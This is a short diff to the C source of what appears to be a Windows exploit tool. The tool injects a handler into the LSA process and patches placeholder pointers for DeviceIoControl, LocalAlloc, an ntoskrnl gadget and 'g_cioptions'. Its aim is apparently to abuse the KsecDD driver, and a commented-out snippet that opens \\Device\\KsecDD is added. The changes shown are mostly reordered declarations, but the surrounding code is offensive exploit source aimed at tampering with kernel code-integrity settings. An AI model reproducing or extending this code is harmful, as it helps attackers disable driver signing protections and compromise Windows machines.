@@ -92,6 +92,12 @@ BOOL WINAPI LsaKsec_SendIoctl_end()
 
 int main()
 {
+	WINDOWS_VERSION windows_version = WINDOWS_UNSUPPORTED;
+	LPVOID RemoteHandler = 0, LocalHandler = 0;
+	SIZE_T szRemoteHandler = (SIZE_T)((PBYTE)LsaKsec_SendIoctl_end - (PBYTE)LsaKsec_SendIoctl);
+	UINT64 ntoskrnl_gadget = 0;
+	UINT64 ci_g_cioptions = 0;
+	HANDLE hProcess = 0, hThread = 0;
 	REPLACEABLE_POINTER ReplPointers[] = {
 		{ L"kernel32.dll", "DeviceIoControl", (PVOID)0x4343434343434343, NULL},
 		{ L"kernel32.dll", "LocalAlloc", (PVOID)0x3131313131313131, NULL },
@@ -102,13 +108,7 @@ int main()
 		{ NULL, NULL, (PVOID)0x2121212121212121, NULL }, // gadget
 		{ NULL, NULL, (PVOID)0x2222222222222222, NULL } // g_cioptions
 	};
-	WINDOWS_VERSION windows_version = WINDOWS_UNSUPPORTED;
-	LPVOID RemoteHandler = 0, LocalHandler = 0;
-	SIZE_T szRemoteHandler = (SIZE_T)((PBYTE)LsaKsec_SendIoctl_end - (PBYTE)LsaKsec_SendIoctl);
-	UINT64 ntoskrnl_gadget = 0;
-	UINT64 ci_g_cioptions = 0;
 	DWORD FakePtrsCount = sizeof(ReplPointers) / sizeof(REPLACEABLE_POINTER), i = 0, lsa = 0;
-	HANDLE hProcess = 0, hThread = 0;
 	
 	windows_version = GetOsBuildNumber();
 	lsa = GetLsaProcessId();
@@ -185,3 +185,12 @@ int main()
 	return 0;
 
 }
+
+
+/*
+#define DD_KSEC_DEVICE_NAME_U LE_U L"\\Device\\KsecDD
+	RtlInitUnicodeString(&DriverName, DD_KSEC_DEVICE_NAME_U);
+	InitializeObjectAttributes(&ObjA, &DriverName, 0, NULL, NULL);
+	NtOpenFile(&hDriverHandle, SYNCHRONIZE | FILE_READ_DATA, &ObjA, &ios2, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, FILE_SYNCHRONOUS_IO_NONALERT);
+
+*/
